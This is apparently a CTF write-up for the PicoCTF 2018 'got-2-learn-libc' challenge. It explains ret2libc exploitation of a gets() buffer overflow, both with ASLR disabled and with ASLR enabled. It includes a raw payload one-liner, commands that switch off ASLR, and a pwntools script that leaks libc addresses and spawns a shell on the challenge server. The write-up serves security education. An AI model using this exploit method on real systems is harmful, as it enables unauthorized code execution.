# Write-up for shellcode challenge
# PicoCTF_2018: got-2-learn-libc

**Category:** Binary Exploitation
**Points:** 250

>This program gives you the address of some system calls. Can you get a shell? You can 
find the program in /problems/got-2-learn-libc_3_6e9881e9ff61c814aafaf92921e88e33 on the shell server. Source.

> # Introduction
In this write-up we're gonna perform a ret2libc attack. I shall show it with 
both ASLR disabled as well as ASLR enabled(for those who don’t know about ASLR, I’ll come to it soon).

> # Senario
Let's consider a typical stack overflow case senario. We have in our hands a vulnerable program and we attempt 
a shell injection taking advantage of a possible buffer overflow. In general, we are trying to overwrite the return address of
the vulnerable fucntion with the address of memory where our shellcode, which we have previously injected into the program as part
of the overflow, is located. Thus, the function returns to the shellcode and not to the legitimate address.
But, let's think something else. As we know, the shellcode is located on the stack (either on a local buffer variable or
an environment variable) or on the heap(dynamically allocated). What if someone forbids stack/heap to execute code?

That's where ret2libc attacks take place. A ret2libc (return to libc, or return to the C library) attack is one in which the
attacker does not require any shellcode to take control of a target, vulnerable
process.  Can you think a function in C library which is very usefull to grab a shell?
> # System()

System() function is what you're searching for. Basically, with system() function we can execute linux commands(e.g. /bin/sh) inside
a C program.

```C
int system(const char *command)
```

I'm not gonna explain ret2libc attack thoroughly in this write-up, but you can find the best explanation [here](https://www.shellblade.net/docs/ret2libc.pdf)
My purpose is to explain the solution of this challenge and to focus on some of the 
obstacles that may arise as we tackle this challenge and how we can overcome them.

> # ASLR

First of all let's clear what aslr means. 
ASLR = Address Space Layout Randomisation is a computer security technique involved in protection from buffer overflow attacks. 
ASLR randomly arranges the address space positions of key data areas of a process, including the base of the executable and the poistions
of the stack, heap, and libraries.

(That's from [Wikipedia:](https://en.wikipedia.org/wiki/Address_space_layout_randomization)

As a result, when ASLR is turned on, the addresses of the stack, etc will be randomized. Thus, it makes it for us very difficult to
predict addresses that we may want to use during exploitation.

> # Crafting payload

Let's see what is happening in our program when we have ASLR enabled and what when disabled. 
To disable ASLR:

```bash
echo "0" | [sudo] dd of=/proc/sys/kernel/randomize_va_space
```
To enable ASLR:
 ```bash
 echo "2" | [sudo] dd of=/proc/sys/kernel/randomize_va_space
 ```
 When it is disabled we notice that addresses don't change.
 
 ![Screenshot from 2019-10-10 19-28-31](https://user-images.githubusercontent.com/37578272/66588021-43ff4200-eb94-11e9-97cb-e6891beffa64.png)
 
 But what happens when ASLR is enabled?
 
 ![Screenshot from 2019-10-10 19-29-08](https://user-images.githubusercontent.com/37578272/66588084-64c79780-eb94-11e9-99e1-eedfca6e7a5c.png)

It seems that every time functions in libc are loaded at a different location. 
Now that we understand what ASLR is let's get through the solution of this challenge in both ways. 

We'll we start with the easy one.
Going into gdb and disassembling our program we fine some nice stuff.
Inside main function we notice that program calls a vuln function (probably vulnerable ;p).

![Screenshot from 2019-10-10 19-38-33](https://user-images.githubusercontent.com/37578272/66589344-fe904400-eb96-11e9-8f28-b823bb3d6ee8.png)

Ohh welcome back friend.
**0x565557d1 <+49>:	call   0x565555b0 <gets@plt>**

gets function is here again. See that in man page of gets:

![Screenshot from 2019-10-10 19-50-50](https://user-images.githubusercontent.com/37578272/66589472-49aa5700-eb97-11e9-9815-5cadf1c7a4a1.png)

Okay, now let's exploit this bug. 
We want to change the return address of vuln function with the address of system function in libc. We also want to pass an argument
to system function which is the pointer of string /bin/sh. Vuln program has already created for us "/bin/sh"
and by running the program we can find the address where this string is located. (See above--> 0x56557030)

We also want to find the system's address. We use gdb for that too.

![Screenshot from 2019-10-10 19-39-42](https://user-images.githubusercontent.com/37578272/66590555-b0c90b00-eb99-11e9-91fa-5c308ecab7b3.png)

A function will expect its first argument to be at ebp+8. Well, the system() function is no exception. So, we'll put string's address
8 bytes after the address of system(). Why?

![Screenshot from 2019-10-10 20-18-41](https://user-images.githubusercontent.com/37578272/66591261-30a3a500-eb9b-11e9-8f19-ee371e928962.png)

That's the situation in the stack before calling RET instruction. 
When ret instruction is executed we jump to system() and ret address is poped. So esp  increases by 4 bytes. So, now we are 4 bytes away of 1st argument of system.
Then we have the prologue of system() :
```asm
push ebp
mov ebp, esp
```
With push ebp, esp decreases by 4 bytes and moves to ebp. So, ebp has an 8 byte difference from string's (/bin/sh) address. 
We succeeded placing system's argument.
We have something like that:
![Screenshot from 2019-10-10 20-26-49](https://user-images.githubusercontent.com/37578272/66591772-567d7980-eb9c-11e9-8baa-cbbc361e6199.png)

For more info, go check the link I've putted in the beginning.

Last but not least, we want to find the distance between the place where ret address is and the input's location in stack. 

It can be observed that buf lies at ebp - 0x9c. 

0x9c is 156 in decimal. Hence, 156 bytes are allocated for buf in the stack,
the next 4 bytes would be the saved ebp pointer of the previous stack frame, and the next 4 bytes will be the return address.

So, according to the screenshot above we need this as an input:

"A" * 160 + "--address of system--" + "A" * 4 + "--address of /bin/sh--"

```bash
python -c 'print "A"*160 + "\x00\xfc\xe0\xf7" + "A"*4 + "\x30\x70\x55\x56"' >  payload
```
Now let's get our flag. Permissions will be like the shellcode challenge. Check them [here](https://github.com/giannoulispanagiotis/picoCTF-2018-wiretup/blob/master/shellcode/README.md)

```bash
(cat payload; cat) | ./vuln
```

Now, we got a shell and executing **cat flag.txt** will give us the flag.

What happens when ASLR is enabled? Every time we run vuln, address of /bin/sh and address of system is different. Our exploit sucks...
That's why vuln give us some addresses. These are libc runtime function addresses. Together with the address of the function 
symbol in the libc library it's possible to calculate the runtime address of the libc base.
Given the address of the runtime libc base and the libc version, it's possible to calculate the address of any runtime libc function(e.g. system).

# Step 1: Identify Libc version

```bash
ldd vuln
```
With this command we can find libc version. In my system is:
**libc.so.6 => /lib/i386-linux-gnu/libc.so.6**

# Step 2: Identify libc base

libc_base - runtime_address_of_func - symbol_address_of_func

# Step 3: Find system() address

system_offset = symbol_address_of_system_func

system_addr = libc_base + system_offset

We have system address, we have address of /bin/sh (vuln program give it to us) 
and we are ready to write our exploit. 
We first want to connect to ctf server and then run ./vuln. We will make use of python and pwntools

```python
#!/usr/bin/python
from pwn import *
import struct


user = 'XXXXX'
pw = 'XXXXX'

s = ssh(host = '2018shell4.picoctf.com', user=user, password=pw)
s.set_working_directory('/problems/got-2-learn-libc_3_6e9881e9ff61c814aafaf92921e88e33')

r = s.process('./vuln')                       # binary name
libc = ELF('/lib/i386-linux-gnu/libc.so.6')     # libc name --- STEP 1



read_offset = libc.symbols['read']     # STEP 2
system_offset = libc.symbols['system'] # sTEP 3
exit_offset = libc.symbols['exit']


# Waiting (recvuntil -- receive until) for 'puts: ' to receive puts address
# Similarly, we pick the other addresses.

r.recvuntil('puts: ')
puts_addr = r.recvuntil("\n")
print puts_addr
r.recvuntil('read: ')
read_addr = int(r.recv(10), 16) # we convert string ( we receive 10 characters ) to integer in base 16. 
r.recvuntil('useful_string: ')
binsh_addr = int(r.recv(10), 16)


libc_base = read_addr - read_offset  # STEP 2
system_ad = libc_base + system_offset # STEP 3

# there is a second way to calculate system's address. 
# We just find (in gdb) the distance of puts_addr and system address(distance stays unaltered) 
offset = -149504 #distance
# then we find puts_addr from vuln program and add the distance to it to find system's address
system_addr = int(puts_addr, 16) + offset


exit_addr = libc_base + exit_offset

print int(puts_addr, 16)
print 'exit addr = ', hex(exit_addr)

print 'puts addr = ', puts_addr
print 'read addr = ', hex(read_addr)

print '/bin/sh addr = ', hex(binsh_addr)
print 'system ad = ', hex(system_ad)
print 'system addr = ', hex(system_addr)

payload = "A"*160
payload += p32(system_addr)
payload += p32(exit_addr)
payload += p32(binsh_addr)


r.sendline(payload)
#pause()
r.interactive()
#r.recv()
#r.sendline('ls')
#r.sendline('cat flag.txt')
#r.sendline('exit')


#print r.recvall()
```
With this python program we'll get a shell in CTF server. Executing **cat flag.txt** will give us the flag.
Congrats! ASLR didn't stop us from solving this challenge. 







